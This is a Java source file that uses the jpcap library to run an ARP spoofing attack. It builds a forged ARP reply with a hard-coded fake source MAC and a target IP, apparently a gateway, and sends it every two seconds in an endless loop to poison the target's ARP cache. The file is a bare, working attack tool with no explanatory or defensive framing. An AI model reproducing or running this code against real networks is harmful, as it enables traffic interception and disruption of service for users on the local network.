package cn.test.main;

import java.net.InetAddress;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;

public class Main {
    static byte[] stomac(String s) {
        byte[] mac = new byte[]{(byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00};
        String[] s1 = s.split("-");
        for (int x = 0; x < s1.length; x++) {
            mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);
        }
        return mac;
    }

    public static void main(String[] args) throws Exception {
        int time = 2;  // 重发间隔时间
        InetAddress desip = InetAddress.getByName("10.89.0.1");// 被欺骗的目标IP地址
        byte[] desmac = stomac("14-14-4b-7d-49-25");// 被欺骗的目标目标MAC数组
        InetAddress srcip = InetAddress.getByName("10.89.25.86");// 源IP地址
        byte[] srcmac = stomac("00-1C-23-2E-A7-0A"); // 假的MAC数组
        // 枚举网卡并打开设备
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
        NetworkInterface device = devices[1];
        JpcapSender sender = JpcapSender.openDevice(device);
        // 设置ARP包
        ARPPacket arp = new ARPPacket();
        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
        arp.prototype = ARPPacket.PROTOTYPE_IP;
        arp.operation = ARPPacket.ARP_REPLY;
        arp.hlen = 6;
        arp.plen = 4;
        arp.sender_hardaddr = srcmac;
        arp.sender_protoaddr = srcip.getAddress();
        arp.target_hardaddr = desmac;
        arp.target_protoaddr = desip.getAddress();
        // 设置DLC帧
        EthernetPacket ether = new EthernetPacket();
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac = srcmac;
        ether.dst_mac = desmac;
        arp.datalink = ether;
        // 发送ARP应答包
        while (true) {
            System.out.println("sending arp..");
            sender.sendPacket(arp);
            Thread.sleep(time * 1000);
        }
    }
}